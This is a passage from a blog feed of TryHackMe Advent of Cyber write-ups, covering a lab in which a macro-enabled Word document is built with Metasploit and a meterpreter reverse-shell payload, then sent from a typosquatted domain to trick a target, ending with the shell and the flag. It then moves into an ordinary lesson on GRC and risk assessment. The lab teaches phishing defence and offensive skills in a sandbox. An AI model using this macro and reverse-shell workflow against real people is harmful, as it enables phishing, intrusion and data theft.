  <li><code class="language-plaintext highlighter-rouge">exit</code> to quit and return to the terminal</li>
</ul>

<p>In the terminal below, you can see the execution of the above steps.</p>

<p>AttackBox Terminal</p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">root</span><span class="p">@</span><span class="nd">AttackBox</span><span class="p">:</span><span class="o">~</span><span class="err">#</span> <span class="nx">msfconsole</span>
<span class="p">[...]</span>
<span class="nx">Metasploit</span> <span class="nx">Documentation</span><span class="p">:</span> <span class="nx">https</span><span class="p">:</span><span class="c1">//docs.metasploit.com/</span>

<span class="nx">msf6</span> <span class="o">&gt;</span> <span class="kd">set</span> <span class="nx">payload</span> <span class="nx">windows</span><span class="o">/</span><span class="nx">meterpreter</span><span class="o">/</span><span class="nx">reverse_tcp</span>
<span class="nx">payload</span> <span class="o">=&gt;</span> <span class="nx">windows</span><span class="o">/</span><span class="nx">meterpreter</span><span class="o">/</span><span class="nx">reverse_tcp</span>
<span class="nx">msf6</span> <span class="o">&gt;</span> <span class="nx">use</span> <span class="nx">exploit</span><span class="o">/</span><span class="nx">multi</span><span class="o">/</span><span class="nx">fileformat</span><span class="o">/</span><span class="nx">office_word_macro</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="nx">Using</span> <span class="nx">configured</span> <span class="nx">payload</span> <span class="nx">windows</span><span class="o">/</span><span class="nx">meterpreter</span><span class="o">/</span><span class="nx">reverse_tcp</span>
<span class="nx">msf6</span> <span class="nf">exploit</span><span class="p">(</span><span class="nx">multi</span><span class="o">/</span><span class="nx">fileformat</span><span class="o">/</span><span class="nx">office_word_macro</span><span class="p">)</span> <span class="o">&gt;</span> <span class="kd">set</span> <span class="nx">LHOST</span> <span class="nx">CONNECTION_IP</span>
<span class="nx">LHOST</span> <span class="o">=&gt;</span> <span class="nx">CONNECTION_IP</span>
<span class="nx">msf6</span> <span class="nf">exploit</span><span class="p">(</span><span class="nx">multi</span><span class="o">/</span><span class="nx">fileformat</span><span class="o">/</span><span class="nx">office_word_macro</span><span class="p">)</span> <span class="o">&gt;</span> <span class="kd">set</span> <span class="nx">LPORT</span> <span class="mi">8888</span>
<span class="nx">LPORT</span> <span class="o">=&gt;</span> <span class="mi">8888</span>
<span class="nx">msf6</span> <span class="nf">exploit</span><span class="p">(</span><span class="nx">multi</span><span class="o">/</span><span class="nx">fileformat</span><span class="o">/</span><span class="nx">office_word_macro</span><span class="p">)</span> <span class="o">&gt;</span> <span class="nx">show</span> <span class="nx">options</span>

<span class="nx">Module</span> <span class="nf">options </span><span class="p">(</span><span class="nx">exploit</span><span class="o">/</span><span class="nx">multi</span><span class="o">/</span><span class="nx">fileformat</span><span class="o">/</span><span class="nx">office_word_macro</span><span class="p">):</span>

   <span class="nx">Name</span>            <span class="nx">Current</span> <span class="nx">Setting</span>  <span class="nx">Required</span>  <span class="nx">Description</span>
   <span class="o">----</span>            <span class="o">---------------</span>  <span class="o">--------</span>  <span class="o">-----------</span>
   <span class="nx">CUSTOMTEMPLATE</span>                   <span class="nx">no</span>        <span class="nx">A</span> <span class="nx">docx</span> <span class="nx">file</span> <span class="nx">that</span> <span class="nx">will</span> <span class="nx">be</span> <span class="nx">used</span> <span class="nx">as</span> <span class="nx">a</span> <span class="nx">template</span> <span class="nx">to</span> <span class="nx">build</span> <span class="nx">the</span> <span class="nx">exploit</span>
   <span class="nx">FILENAME</span>        <span class="nx">msf</span><span class="p">.</span><span class="nx">docm</span>         <span class="nx">yes</span>       <span class="nx">The</span> <span class="nx">Office</span> <span class="nb">document</span> <span class="nx">macro</span> <span class="nf">file </span><span class="p">(</span><span class="nx">docm</span><span class="p">)</span>


<span class="nx">Payload</span> <span class="nf">options </span><span class="p">(</span><span class="nx">windows</span><span class="o">/</span><span class="nx">meterpreter</span><span class="o">/</span><span class="nx">reverse_tcp</span><span class="p">):</span>

   <span class="nx">Name</span>      <span class="nx">Current</span> <span class="nx">Setting</span>  <span class="nx">Required</span>  <span class="nx">Description</span>
   <span class="o">----</span>      <span class="o">---------------</span>  <span class="o">--------</span>  <span class="o">-----------</span>
   <span class="nx">EXITFUNC</span>  <span class="nx">thread</span>           <span class="nx">yes</span>       <span class="nx">Exit</span> <span class="nf">technique </span><span class="p">(</span><span class="nx">Accepted</span><span class="p">:</span> <span class="dl">''</span><span class="p">,</span> <span class="nx">seh</span><span class="p">,</span> <span class="nx">thread</span><span class="p">,</span> <span class="nx">process</span><span class="p">,</span> <span class="nx">none</span><span class="p">)</span>
   <span class="nx">LHOST</span>     <span class="nx">CONNECTION_IP</span>    <span class="nx">yes</span>       <span class="nx">The</span> <span class="nx">listen</span> <span class="nf">address </span><span class="p">(</span><span class="nx">an</span> <span class="kr">interface</span> <span class="nx">may</span> <span class="nx">be</span> <span class="nx">specified</span><span class="p">)</span>
   <span class="nx">LPORT</span>     <span class="mi">8888</span>             <span class="nx">yes</span>       <span class="nx">The</span> <span class="nx">listen</span> <span class="nx">port</span>

   <span class="o">**</span><span class="nx">DisablePayloadHandler</span><span class="p">:</span> <span class="nc">True   </span><span class="p">(</span><span class="nx">no</span> <span class="nx">handler</span> <span class="nx">will</span> <span class="nx">be</span> <span class="nx">created</span><span class="o">!</span><span class="p">)</span><span class="o">**</span>


<span class="nx">Exploit</span> <span class="nx">target</span><span class="p">:</span>

   <span class="nx">Id</span>  <span class="nx">Name</span>
   <span class="o">--</span>  <span class="o">----</span>
   <span class="mi">0</span>   <span class="nx">Microsoft</span> <span class="nx">Office</span> <span class="nx">Word</span> <span class="nx">on</span> <span class="nx">Windows</span>


<span class="nx">View</span> <span class="nx">the</span> <span class="nx">full</span> <span class="nx">module</span> <span class="nx">info</span> <span class="kd">with</span> <span class="nx">the</span> <span class="nx">info</span><span class="p">,</span> <span class="nx">or</span> <span class="nx">info</span> <span class="o">-</span><span class="nx">d</span> <span class="nx">command</span><span class="p">.</span>

<span class="nx">msf6</span> <span class="nf">exploit</span><span class="p">(</span><span class="nx">multi</span><span class="o">/</span><span class="nx">fileformat</span><span class="o">/</span><span class="nx">office_word_macro</span><span class="p">)</span> <span class="o">&gt;</span> <span class="nx">exploit</span>

<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="nx">Using</span> <span class="nx">template</span><span class="p">:</span> <span class="o">/</span><span class="nx">opt</span><span class="o">/</span><span class="nx">metasploit</span><span class="o">-</span><span class="nx">framework</span><span class="o">/</span><span class="nx">embedded</span><span class="o">/</span><span class="nx">framework</span><span class="o">/</span><span class="nx">data</span><span class="o">/</span><span class="nx">exploits</span><span class="o">/</span><span class="nx">office_word_macro</span><span class="o">/</span><span class="nx">template</span><span class="p">.</span><span class="nx">docx</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="nx">Injecting</span> <span class="nx">payload</span> <span class="k">in</span> <span class="nb">document</span> <span class="nx">comments</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="nx">Injecting</span> <span class="nx">macro</span> <span class="nx">and</span> <span class="nx">other</span> <span class="nx">required</span> <span class="nx">files</span> <span class="k">in</span> <span class="nb">document</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="nx">Finalizing</span> <span class="nx">docm</span><span class="p">:</span> <span class="nx">msf</span><span class="p">.</span><span class="nx">docm</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="nx">msf</span><span class="p">.</span><span class="nx">docm</span> <span class="nx">stored</span> <span class="nx">at</span> <span class="o">/</span><span class="nx">root</span><span class="o">/</span><span class="p">.</span><span class="nx">msf4</span><span class="o">/</span><span class="nx">local</span><span class="o">/</span><span class="nx">msf</span><span class="p">.</span><span class="nx">docm</span>
<span class="nx">msf6</span> <span class="nf">exploit</span><span class="p">(</span><span class="nx">multi</span><span class="o">/</span><span class="nx">fileformat</span><span class="o">/</span><span class="nx">office_word_macro</span><span class="p">)</span> <span class="o">&gt;</span> <span class="nx">exit</span>
</code></pre></div></div>

<p>As you can see, the Word document with the embedded macro was created and stored in <code class="language-plaintext highlighter-rouge">/root/.msf4/local/msf.docm</code>.</p>

<h2 id="the-created-macro-enabled-document">The Created Macro-Enabled Document</h2>

<p>We mentioned earlier how to create a macro within an MS Word document. You might be interested to see the content of the file created by <code class="language-plaintext highlighter-rouge">msfconsole</code>. In the screenshot below, we can see the different procedures and functions that make up this macro. <strong>Note:</strong>The AttackBox doesn’t have MS Office installed, so for this section you only have to read along. \n</p>

<ol>
  <li><code class="language-plaintext highlighter-rouge">AutoOpen()</code> triggers the macro automatically when a Word document is opened. It searches through the document’s properties, looking for content in the “Comments” field. The data saved using <code class="language-plaintext highlighter-rouge">base64</code> encoding in the Comments field is actually the payload.</li>
  <li><code class="language-plaintext highlighter-rouge">Base64Decode()</code> converts the payload to its original form. In this case, it is an executable MS Windows file.</li>
  <li><code class="language-plaintext highlighter-rouge">ExecuteForWindows()</code> executes the payload in a temporary directory. It connects to the specified attacker’s system IP address and port.</li>
</ol>

<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/5f04259cf9bf5b57aed2c476-1729859885481.png" alt="Example macro code with functions and subroutines" /> \n</p>

<p>The <strong>Comments</strong> field is shown in the screenshot below. It is close to 100,000 characters in our case.</p>

<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/5f04259cf9bf5b57aed2c476-1729859926077.png" alt="The Comments field in an MS Office document" /> \n</p>

<p>If you copy it and save it to a text file, you can convert it to its original executable format using <code class="language-plaintext highlighter-rouge">base64</code> as shown below. You can notice the size of the files.</p>

<p>AttackBox Terminal</p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">root</span><span class="p">@</span><span class="nd">AttackBox</span><span class="p">:</span><span class="o">~</span><span class="err">#</span> <span class="nx">base64</span> <span class="o">-</span><span class="nx">d</span> <span class="nx">payload</span><span class="o">-</span><span class="nx">base64</span><span class="p">.</span><span class="nx">txt</span> <span class="o">&gt;</span> <span class="nx">payload</span><span class="p">.</span><span class="nx">exe</span>
<span class="nx">root</span><span class="p">@</span><span class="nd">attackbox</span><span class="p">:</span><span class="o">~</span><span class="err">#</span> <span class="nx">ls</span> <span class="o">-</span><span class="nx">lh</span>
<span class="o">-</span><span class="nx">rw</span><span class="o">-</span><span class="nx">r</span><span class="o">--</span><span class="nx">r</span><span class="o">--</span><span class="p">.</span> <span class="mi">1</span> <span class="nx">root</span> <span class="nx">root</span> <span class="mi">97</span><span class="nx">K</span> <span class="nx">payload</span><span class="o">-</span><span class="nx">base64</span><span class="p">.</span><span class="nx">txt</span>
<span class="o">-</span><span class="nx">rw</span><span class="o">-</span><span class="nx">r</span><span class="o">--</span><span class="nx">r</span><span class="o">--</span><span class="p">.</span> <span class="mi">1</span> <span class="nx">root</span> <span class="nx">root</span> <span class="mi">73</span><span class="nx">K</span> <span class="nx">payload</span><span class="p">.</span><span class="nx">exe</span>
</code></pre></div></div>

<p>You already expect this file to connect to the specified IP address and port. If you would like to check its behaviour in a sandbox, you can check the <a href="https://www.virustotal.com/gui/file/ab3f9303460c590c452f0c259a35d50a7a2e7c52a81d4e5a42bb98b365d8ab9b/behavior">VirusTotal report</a> for a file that we created and uploaded. In this case, it attempts to connect to <code class="language-plaintext highlighter-rouge">10.9.18.120</code>.</p>

<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/5f04259cf9bf5b57aed2c476-1729859908974.png" alt="VirusTotal summary of the payload behaviour" /> \n</p>

<h2 id="listening-for-incoming-connections">Listening for Incoming Connections</h2>

<p>We again will use the Metasploit Framework, but this time to listen for incoming connections when a target users opens our phishing Word document. This requires the following commands:</p>

<ul>
  <li>Open a new terminal window and run <code class="language-plaintext highlighter-rouge">msfconsole</code> to start the Metasploit Framework</li>
  <li><code class="language-plaintext highlighter-rouge">use multi/handler</code> to handle incoming connections</li>
  <li><code class="language-plaintext highlighter-rouge">set payload windows/meterpreter/reverse_tcp</code>to ensure that our payload works with the payload used when creating the malicious macro \n</li>
  <li><code class="language-plaintext highlighter-rouge">set LHOST CONNECTION_IP</code> specifies the IP address of the attacker’s system and should be the same as the one used when creating the document</li>
  <li><code class="language-plaintext highlighter-rouge">set LPORT 8888</code> specifies the port number you are going to listen on and should be the same as the one used when creating the document</li>
  <li><code class="language-plaintext highlighter-rouge">show options</code> to confirm the values of your options</li>
  <li><code class="language-plaintext highlighter-rouge">exploit</code> starts listening for incoming connections to establish a reverse shell</li>
</ul>

<p>AttackBox Terminal</p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">root</span><span class="p">@</span><span class="nd">AttackBox</span><span class="p">:</span><span class="o">~</span><span class="err">#</span> <span class="nx">msfconsole</span>
<span class="p">[...]</span>
<span class="nx">Metasploit</span> <span class="nx">Documentation</span><span class="p">:</span> <span class="nx">https</span><span class="p">:</span><span class="c1">//docs.metasploit.com/</span>

<span class="nx">msf6</span> <span class="o">&gt;</span> <span class="nx">use</span> <span class="nx">multi</span><span class="o">/</span><span class="nx">handler</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="nx">Using</span> <span class="nx">configured</span> <span class="nx">payload</span> <span class="nx">generic</span><span class="o">/</span><span class="nx">shell_reverse_tcp</span>
<span class="nx">msf6</span> <span class="nf">exploit</span><span class="p">(</span><span class="nx">multi</span><span class="o">/</span><span class="nx">handler</span><span class="p">)</span> <span class="o">&gt;</span> <span class="kd">set</span> <span class="nx">payload</span> <span class="nx">windows</span><span class="o">/</span><span class="nx">meterpreter</span><span class="o">/</span><span class="nx">reverse_tcp</span>
<span class="nx">payload</span> <span class="o">=&gt;</span> <span class="nx">windows</span><span class="o">/</span><span class="nx">meterpreter</span><span class="o">/</span><span class="nx">reverse_tcp</span>
<span class="nx">msf6</span> <span class="nf">exploit</span><span class="p">(</span><span class="nx">multi</span><span class="o">/</span><span class="nx">handler</span><span class="p">)</span> <span class="o">&gt;</span> <span class="kd">set</span> <span class="nx">LHOST</span> <span class="nx">CONNECTION_IP</span>
<span class="nx">LHOST</span> <span class="o">=&gt;</span> <span class="nx">CONNECTION_IP</span>
<span class="nx">msf6</span> <span class="nf">exploit</span><span class="p">(</span><span class="nx">multi</span><span class="o">/</span><span class="nx">handler</span><span class="p">)</span> <span class="o">&gt;</span> <span class="kd">set</span> <span class="nx">LPORT</span> <span class="mi">8888</span>
<span class="nx">LPORT</span> <span class="o">=&gt;</span> <span class="mi">8888</span>
<span class="nx">msf6</span> <span class="nf">exploit</span><span class="p">(</span><span class="nx">multi</span><span class="o">/</span><span class="nx">handler</span><span class="p">)</span> <span class="o">&gt;</span> <span class="nx">show</span> <span class="nx">options</span>

<span class="nx">Module</span> <span class="nf">options </span><span class="p">(</span><span class="nx">exploit</span><span class="o">/</span><span class="nx">multi</span><span class="o">/</span><span class="nx">handler</span><span class="p">):</span>

   <span class="nx">Name</span>  <span class="nx">Current</span> <span class="nx">Setting</span>  <span class="nx">Required</span>  <span class="nx">Description</span>
   <span class="o">----</span>  <span class="o">---------------</span>  <span class="o">--------</span>  <span class="o">-----------</span>


<span class="nx">Payload</span> <span class="nf">options </span><span class="p">(</span><span class="nx">windows</span><span class="o">/</span><span class="nx">meterpreter</span><span class="o">/</span><span class="nx">reverse_tcp</span><span class="p">):</span>

   <span class="nx">Name</span>      <span class="nx">Current</span> <span class="nx">Setting</span>  <span class="nx">Required</span>  <span class="nx">Description</span>
   <span class="o">----</span>      <span class="o">---------------</span>  <span class="o">--------</span>  <span class="o">-----------</span>
   <span class="nx">EXITFUNC</span>  <span class="nx">process</span>          <span class="nx">yes</span>       <span class="nx">Exit</span> <span class="nf">technique </span><span class="p">(</span><span class="nx">Accepted</span><span class="p">:</span> <span class="dl">''</span><span class="p">,</span> <span class="nx">seh</span><span class="p">,</span> <span class="nx">thread</span><span class="p">,</span> <span class="nx">process</span><span class="p">,</span> <span class="nx">none</span><span class="p">)</span>
   <span class="nx">LHOST</span>     <span class="nx">CONNECTION_IP</span>    <span class="nx">yes</span>       <span class="nx">The</span> <span class="nx">listen</span> <span class="nf">address </span><span class="p">(</span><span class="nx">an</span> <span class="kr">interface</span> <span class="nx">may</span> <span class="nx">be</span> <span class="nx">specified</span><span class="p">)</span>
   <span class="nx">LPORT</span>     <span class="mi">8888</span>             <span class="nx">yes</span>       <span class="nx">The</span> <span class="nx">listen</span> <span class="nx">port</span>


<span class="nx">Exploit</span> <span class="nx">target</span><span class="p">:</span>

   <span class="nx">Id</span>  <span class="nx">Name</span>
   <span class="o">--</span>  <span class="o">----</span>
   <span class="mi">0</span>   <span class="nx">Wildcard</span> <span class="nx">Target</span>



<span class="nx">View</span> <span class="nx">the</span> <span class="nx">full</span> <span class="nx">module</span> <span class="nx">info</span> <span class="kd">with</span> <span class="nx">the</span> <span class="nx">info</span><span class="p">,</span> <span class="nx">or</span> <span class="nx">info</span> <span class="o">-</span><span class="nx">d</span> <span class="nx">command</span><span class="p">.</span>

<span class="nx">msf6</span> <span class="nf">exploit</span><span class="p">(</span><span class="nx">multi</span><span class="o">/</span><span class="nx">handler</span><span class="p">)</span> <span class="o">&gt;</span> <span class="nx">exploit</span>

<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="nx">Started</span> <span class="nx">reverse</span> <span class="nx">TCP</span> <span class="nx">handler</span> <span class="nx">on</span> <span class="nx">CONNECTION_IP</span><span class="p">:</span><span class="mi">8888</span>
</code></pre></div></div>

<p>\n</p>

<h2 id="email-the-malicious-document">Email the Malicious Document</h2>

<p>The malicious document has been created. All you need to do is to send it to the target user. It is time to send an email to the target user, <code class="language-plaintext highlighter-rouge">marta@socmas.thm</code>. Mayor Malware has prepared the following credentials:</p>

<ul>
  <li>Email: <code class="language-plaintext highlighter-rouge">info@socnas.thm</code></li>
  <li>Password: <code class="language-plaintext highlighter-rouge">MerryPhishMas!</code></li>
</ul>

<p>Notice how Mayor Malware uses a domain name that looks similar to the target user’s. This technique is known as “typosquatting,” where attackers create domain names that are nearly identical to legitimate ones in order to trick victims. On the AttackBox, start the Firefox web browser and head to http://MACHINE_IP. Use the above credentials to log in.</p>

<p>Once logged in, compose an email to the target user, and don’t forget to attach the document you created. Changing the name to something more convincing, such as <code class="language-plaintext highlighter-rouge">invoice.docm</code> or <code class="language-plaintext highlighter-rouge">receipt.docm</code> might be a good idea. Also, write a couple of sentences explaining what you are attaching to convince Marta May Ware to open the document. <strong>Note:</strong> You can use CTRL+H on the file upload pop-up to be able to see the <code class="language-plaintext highlighter-rouge">.msf4</code> directory where our email attachment is located.</p>

<h2 id="exploitation">Exploitation</h2>

<p>If everything works out, you will get a reverse shell after about 2 minutes. You can access the files and folders on the target system via the command line. You can use <code class="language-plaintext highlighter-rouge">cat</code> to display any text file.</p>

<p>AttackBox Terminal</p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">msf6</span> <span class="nf">exploit</span><span class="p">(</span><span class="nx">multi</span><span class="o">/</span><span class="nx">handler</span><span class="p">)</span> <span class="o">&gt;</span> <span class="nx">exploit</span>

<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="nx">Started</span> <span class="nx">reverse</span> <span class="nx">TCP</span> <span class="nx">handler</span> <span class="nx">on</span> <span class="nx">CONNECTION_IP</span><span class="p">:</span><span class="mi">8888</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="nx">Sending</span> <span class="nf">stage </span><span class="p">(</span><span class="mi">176198</span> <span class="nx">bytes</span><span class="p">)</span> <span class="nx">to</span> <span class="mf">10.10</span><span class="p">.</span><span class="mf">103.92</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="nx">Meterpreter</span> <span class="nx">session</span> <span class="mi">1</span> <span class="nf">opened </span><span class="p">(</span><span class="nx">CONNECTION_IP</span><span class="p">:</span><span class="mi">8888</span> <span class="o">-&gt;</span> <span class="mf">10.10</span><span class="p">.</span><span class="mf">103.92</span><span class="p">:</span><span class="mi">52536</span><span class="p">)</span> <span class="nx">at</span> <span class="mi">2024</span><span class="o">-</span><span class="mi">11</span><span class="o">-</span><span class="mi">24</span> <span class="mi">16</span><span class="p">:</span><span class="mi">37</span><span class="p">:</span><span class="mi">47</span> <span class="o">+</span><span class="mi">0300</span>
<span class="nx">meterpreter</span> <span class="o">&gt;</span> <span class="nx">cd</span> <span class="nx">c</span><span class="p">:</span><span class="o">/</span><span class="nx">users</span><span class="o">/</span><span class="nx">Administrator</span><span class="o">/</span><span class="nx">Desktop</span>
<span class="nx">meterpreter</span> <span class="o">&gt;</span> <span class="nx">ls</span>
<span class="p">[...]</span>
<span class="nx">meterpreter</span> <span class="o">&gt;</span>
</code></pre></div></div>

<p>Answer the questions below</p>

<p>What is the flag value inside the <code class="language-plaintext highlighter-rouge">flag.txt</code> file that’s located on the Administrator’s desktop?</p>

<p>THM{PHISHING_CHRISTMAS}</p>

<p>If you enjoyed this task, feel free to check out the <a href="https://tryhackme.com/module/phishing">Phishing</a> module.</p>]]></content><author><name>Michael</name></author><summary type="html"><![CDATA[The Story]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/Day10-logo.svg" /><media:content medium="image" url="http://localhost:4000/Day10-logo.svg" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">TryHackMe Advent of Cyber - Day 9</title><link href="http://localhost:4000/Day9" rel="alternate" type="text/html" title="TryHackMe Advent of Cyber - Day 9" /><published>2024-12-09T00:00:00-05:00</published><updated>2024-12-09T00:00:00-05:00</updated><id>http://localhost:4000/Day9</id><content type="html" xml:base="http://localhost:4000/Day9"><![CDATA[<p>The Story</p>

<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/6093e17fa004d20049b6933e-1731940347460.png" alt="Task banner for day 9" /></p>

<p>Click here to watch the walkthrough video!</p>

<p>McSkidy and Glitch want to hire an eDiscovery company to process some forensic data for their investigation. They have invited bids from third parties for this purpose. Three companies have bid for the project. McSkidy and Glitch now need to do a risk assessment on all three of these companies to identify the one with the least amount of risk so that they can move forward. All three companies were required to fill out a questionnaire based on which a risk assessment will be done.</p>

<h2 id="introduction-to-grc">Introduction to GRC</h2>

<p>Governance, Risk, and Compliance (GRC) plays a crucial role in any organisation to ensure that their security practices align with their personal, regulatory, and legal obligations. Although in general good security practices help protect a business from suffering a breach, depending on the sector in which an organisation operates, there may be external security regulations that it needs to adhere to.</p>

<p><img src="https://assets.tryhackme.com/additional/aoc2024/gifs/da9-1.gif" alt="a picture of an organisation with three rings expanding, showing the acronym GRC with a padlock" /> \n</p>

<p>Let’s take a look at some examples in the financial sector:</p>

<ul>
  <li><strong>Reserve Bank Regulations:</strong> In most countries, banks have to adhere to the security regulations set forth by the country’s reserve bank. This ensures that each bank adheres to a minimum security level to protect the funds and information of their customers.</li>
  <li><strong>SWIFT CSP:</strong> Banks use the SWIFT network to communicate with each other and send funds. After a <a href="https://www.wired.com/2016/05/insane-81m-bangladesh-bank-heist-heres-know/">massive bank breach resulted in a $81 million fraudulent SWIFT transfer</a>, SWIFT created the Customer Security Programme (CSP), which sets the standard of security for banks to connect to the SWIFT network.</li>
  <li><strong>Data Protection:</strong> As banks hold sensitive information about their customers, they have to adhere to the security standards created by their data regulator (usually the reserve bank in most countries).</li>
</ul>

<p>When you run a large organisation with multiple different teams, how do you stay on top of all these regulations and ensure that good security is applied by all teams? <strong>This is where GRC comes in.</strong>They play a crucial role in understanding external security standards, translating them into internal standards, and then ensuring that they are applied by all teams to help reduce the organisation’s risk to an acceptable level. Let’s take a quick look at the three functions of GRC. \n</p>

<p><strong>Governance</strong>   <img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/6093e17fa004d20049b6933e-1730218854578.png" alt="Crown of governance" /></p>

<p>Governance is the function that creates the framework that an organisation uses to make decisions regarding information security. Governance is the creation of an organisation’s security strategy, policies, standards, and practices in alignment with the organisation’s overall goal. Governance also defines the roles and responsibilities that everyone in the organisation has to play to help ensure these security standards are met. \n</p>

<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/6093e17fa004d20049b6933e-1730218854403.png" alt="Inspection glass of risk" />Risk</p>

<p>Risk is the function that helps to identify, assess, quantify, and mitigate risk to the organisation’s IT assets. Risk helps the organisation understand potential threats and vulnerabilities and the impact that they could have if a threat actor were to execute or exploit them. By simply turning on a computer, an organisation has some level of risk of a cyber attack. The risk function is important to help reduce the overall risk to an acceptable level and develop contingency plans in the event of a cyber attack where a risk is realised. \n</p>

<p><strong>Compliance</strong>   <img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/6093e17fa004d20049b6933e-1730218854574.png" alt="Clipboard of compliance" /></p>

<p>Compliance is the function that ensures that the organisation adheres to all external legal, regulatory, and industry standards. For example, adhering to the <a href="https://gdpr-info.eu/">GDPR law</a> or aligning the organisation’s security to an industry standard such as NIST or ISO 27001.</p>

<h2 id="introduction-to-risk-assessments">Introduction to Risk Assessments</h2>

<p>Before McSkidy and Glitch choose an eDiscovery company to handle their forensic data, they need to figure out which one is the safest choice. This is where a risk assessment comes in. It’s a process to identify potential problems before they happen. Think of it as checking the weather before going on a hike; if there’s a storm coming, you’d want to know ahead of time so you can either prepare or change your plans.</p>

<h2 id="why-are-risk-assessments-done">Why Are Risk Assessments Done?</h2>

<p>Risk assessments are like a reality check for businesses. They connect cyber security to the bigger picture, which <strong>minimises business risk</strong>. In other words, it’s not just about securing data but about protecting the business as a whole.</p>

<p>Imagine you run an online store that collects customer information like names, addresses, and credit card details. If that data gets stolen because of a weak security system, it’s not just the data that’s at risk—your reputation, customer trust, and even your profits are on the line. A <strong>risk assessment</strong> could have helped you identify that weak point and fix it before anything went wrong.</p>

<p>For McSkidy and Glitch, assessing the risks of each eDiscovery company helps them decide which one is less likely to have a data breach or other issues that could disrupt the investigation.</p>

<h2 id="performing-a-risk-assessment">Performing a Risk Assessment</h2>

<p>Every business’s main goal is to generate revenues and profits. For most businesses, cyber security does not directly contribute to revenue generation or profit maximisation. Businesses decide to spend part of their hard-earned revenue on cyber security to avoid the risk of revenue or reputation loss resulting from a cyber threat. Businesses often take these steps to achieve this goal. We will now work through the process of completing a risk register. A risk register tracks the progress of risk mitigation and all open risks. An example of such a risk register is shown in the animation below. Let’s take a look at the steps required to add risks to the risk register.</p>

<p><img src="https://assets.tryhackme.com/additional/aoc2024/gifs/day9-2.gif" alt="an animation of filling out a risk assessment form" /> \n</p>

<p><strong>Identification of Risks</strong></p>

<p>To assess risk, we must first identify the factors that can cause revenue or reputation loss resulting from cyber threats. This exercise requires carefully assessing the attack surface of the organisation and identifying areas which might be used to harm the organisation. Examples of identified risks can be:</p>

<ul>
  <li>An unpatched web server.</li>
  <li>A high-privileged user account without proper security controls.</li>
  <li>A third-party vendor who might be infected by a malware connecting to the organisation’s network.</li>
  <li>A system for which support has ended by the vendor and it is still in production.</li>
</ul>

<p>An organisation might identify several other risks in addition to these examples. However, in addition to just identifying risks, these risks also need to be quantified. After all, the likelihood of materialising a risk on a cordoned-off and isolated server differs greatly from that of a public-facing server hosting a web frontend. Similarly, the impact of a risk materializing on a crown jewel, such as a main database server containing confidential information, differs greatly from that of a development server with dummy data.</p>

<p>**Assigning Likelihood to Each Risk \n **</p>

<p>To quantify risk, we need to identify how likely or probable it is that the risk will materialise.   <img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/6093e17fa004d20049b6933e-1730225302945.png" alt="Choosing likelihood for each risk" /> We can then assign a number to quantify this likelihood. This number is often on a scale of 1 to 5. The exact scale differs from organisation to organisation and from framework to framework. Likelihood can also be called the probability of materialisation of a risk. An example scale for likelihood can be:</p>

<ol>
  <li><strong>Improbable:</strong> So unlikely that it might never happen.</li>
  <li><strong>Remote:</strong> Very unlikely to happen, but still, there is a possibility.</li>
  <li><strong>Occasional:</strong> Likely to happen once/sometime.</li>
  <li><strong>Probable:</strong> Likely to happen several times.</li>
  <li><strong>Frequent:</strong> Likely to happen often and regularly.</li>
</ol>

<p>It might be noticed that while we are trying to quantify the risk, we still don’t define exact quantities of what constitutes several times and what constitutes regularly, etc. The reason is that the likelihood for a server which has very high uptime requirements will be different from a server that is used infrequently. Therefore, the likelihood scale will differ from case to case and from asset to asset. On the flip side, we can see that this scale provides us with a very usable scale of differentiating between different probabilities of occurrence of a certain event.</p>

<p><strong>Assigning Impact to Each Risk</strong></p>

<p>Once we have identified the risks and the likelihood of a risk, the next step is to quantify the impact this risk’s materialisation might have on the organisation. For example, if there is a public-facing web server that is unpatched and gets breached, what will be the impact on the organisation?   <img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/6093e17fa004d20049b6933e-1732025443659.png" alt="Assigning a impact rating to risks" /> Different organisations calculate impact in different ways. Some organisations might use the CVSS scoring to calculate the impact of a risk; others might use their own rating derived from the Confidentiality, Integrity, and Availability of a certain asset, and others might base it on the severity categorisation of the incidents. Similar to likelihood, we also quantify impact, often on a scale of 1 to 5. An example scale of impact can be based on the following definitions.</p>

<ol>
  <li><strong>Informational:</strong> Very low impact, almost non-existent.</li>
  <li><strong>Low:</strong> Impacting a limited part of one area of the organisation’s operations, with little to no revenue loss.</li>
  <li><strong>Medium:</strong> Impacting one part of the organisation’s operations completely, with major revenue loss.</li>
  <li><strong>High:</strong> Impacting several parts of the organisation’s operations, causing significant revenue loss</li>
  <li><strong>Critical:</strong> Posing an existential threat to the organisation.</li>
</ol>

<p>**Risk Ownership \n **</p>

